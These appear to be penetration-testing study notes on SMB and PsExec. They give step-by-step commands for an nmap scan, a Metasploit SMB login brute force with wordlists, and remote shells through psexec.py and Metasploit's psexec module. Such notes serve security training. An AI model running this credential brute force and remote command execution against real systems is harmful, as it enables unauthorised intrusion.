What is SMB:
-----------------------------

> SMB (Server Message Block) is a network file sharing protocol that is used to
  facilitate the sharing of files and peripherals (printers and serial ports) between
  computers on a local network (LAN).
> SMB uses port 445 (TCP). However, originally, SMB ran on top of NetBIOS using
  port 139.
> SAMBA is the open source Linux implementation of SMB, and allows Windows
  systems to access Linux shares and devices.

SMB Authntication:
-----------------------------

> The SMB protocol utilizes two levels of authentication, namely:
  > User Authentication
  > Share Authentication
> User authentication - Users must provide a username and password in order
  to authenticate with the SMB server in order to access a share.
> Share authentication - Users must provide a password in order to access
  restricted share.
  
  Note: Both of these authentication levels utilize a challenge response
  authentication system.
  
What is PsExec:
-----------------------------  

> PsExec is a lightweight telnet-replacement developed by Microsoft that
  allows you execute processes on remote windows systems using any userâ€™s
  credentials.
> PsExec authentication is performed via SMB.
> We can use the PsExec utility to authenticate with the target system
  legitimately and run arbitrary commands or launch a remote command
  prompt.
> It is very similar to RDP, however, instead of controlling the remote system
  via GUI, commands are sent via CMD.
  
SMB Exploitation with PsExec:
-----------------------------

> In order to utilize PsExec to gain access to a Windows target, we will need to identify
  legitimate user accounts and their respective passwords or password hashes.
> This can be done by leveraging various tools and techniques, however, the most
  common technique will involve performing an SMB login brute-force attack.
> We can narrow down our brute-force attack to only include common Windows user
  accounts like:
  > Administrator
> After we have obtained a legitimate user account and password, we can use the
  credentials to authenticate with the target system via PsExec and execute arbitrary
  system commands or obtain a reverse shell.
  

> nmap -sV -sC <IP>
  > SMB on port 445
  > smb-security-mode

> msfconsole smb login brute force:
> service postgresql start && msfconsole
  > search smb_login
    > use auxiliary/scanner/smb/smb_login
      > set RHOSTS <IP>
      > set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
      > set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
      > set VERBOSE false
      > run

> PsExec Shell:
> psexec.py <User>@<IP> cmd.exe
  > enter password
  
> psexec in msfconsole:
> search psexec
  > use exploit/windows/smb/psexec
    > set RHOSTS <IP>
    > set SMBUser <User>
    > set SMBPass <Pass>
    > run
